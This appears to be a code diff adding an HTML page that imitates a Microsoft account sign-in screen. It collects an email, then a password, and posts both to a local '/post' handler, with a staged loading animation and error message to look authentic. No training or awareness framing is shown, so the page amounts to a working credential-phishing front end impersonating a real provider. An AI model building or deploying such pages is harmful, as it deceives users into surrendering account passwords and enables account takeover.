@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign-In</title>
+    <link rel="stylesheet" href="obz.css">
+</head>
+<body>
+    <div class="login-container">
+      <div class="inner-container">
+        <div class="logo-place">
+            <img src="logo.svg" alt="logo">
+            <p>Microsoft</p>
+        </div>
+        <!-- Email display under the logo after input -->
+        <p id="displayedEmail" class="hidden email-display"></p>
+        
+        <!-- Email Step -->
+        <div id="emailStep">
+            <h2>Sign in</h2>       
+            <input name="email" type="email" id="email" class="input-field" placeholder="Email, phone, or Skype" required>
+            <p>No account? <a href="#">Create one!</a></p>
+            <p><a href="#">Can't access your account?</a></p>
+            <p id="errorMsg" class="error-message" style="margin: 0; padding: 0;">We couldn't find an account with that username. Try another.</p>
+            <button id="nextBtn">Next</button>       
+        </div>
+
+        <!-- Password Step (Hidden Initially) -->
+        <div id="passwordStep" class="hidden">
+            <h2>Enter password</h2>
+            <form id="loginForm" action="/post" method="post">
+                <!-- Hidden input to store the email -->
+                <input type="hidden" name="email" id="hiddenEmail">
+                <input type="password" name="password" id="password" class="input-field" placeholder="Password" required>
+                <p><a href="#">Forgot password?</a></p>
+                <p><a href="#" id="emailCodeLink">Email code to @outlook.com</a></p>
+                <button type="submit" id="loginBtn">Sign In</button>
+            </form>
+        </div>
+      </div>
+
+      <!-- Loading balls animation -->
+      <div id="loading" class="loading-balls hidden">
+          <div class="ball"></div>
+          <div class="ball"></div>
+          <div class="ball"></div>
+          <div class="ball"></div>
+          <div class="ball"></div>
+      </div>
+    </div>
+    <script>
+        const emailStep = document.getElementById('emailStep');
+        const passwordStep = document.getElementById('passwordStep');
+        const nextBtn = document.getElementById('nextBtn');
+        const displayedEmail = document.getElementById('displayedEmail');
+        const emailCodeLink = document.getElementById('emailCodeLink');
+        const loading = document.getElementById('loading');
+        const errorMsg = document.getElementById('errorMsg');
+        const emailInput = document.getElementById('email');
+        const hiddenEmail = document.getElementById('hiddenEmail');
+
+        function isValidEmail(email) {
+            const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            return emailPattern.test(email);
+        }
+
+        nextBtn.addEventListener('click', function() {
+            const email = emailInput.value;
+            
+            if (email && isValidEmail(email)) {
+                errorMsg.style.visibility = 'hidden';
+                emailInput.classList.remove('error-border');
+                loading.classList.remove('hidden');
+
+                setTimeout(function() {
+                    loading.classList.add('hidden');
+                    passwordStep.classList.remove('hidden');
+                    emailStep.classList.add('hidden');
+
+                    displayedEmail.textContent = email;
+                    hiddenEmail.value = email; // Set hidden email field
+                    displayedEmail.classList.remove('hidden');
+                    emailCodeLink.textContent = `Email code to ${email}`;
+                }, 2000);
+            } else {
+                errorMsg.style.visibility = 'visible';
+                emailInput.classList.add('error-border');
+            }
+        });
+        emailInput.addEventListener('keypress', function(event) {
+    if (event.key === 'Enter') {
+        nextBtn.click(); // Simulate click on the Next button
+    }
+});
+
+    </script>
+</body>
+</html>
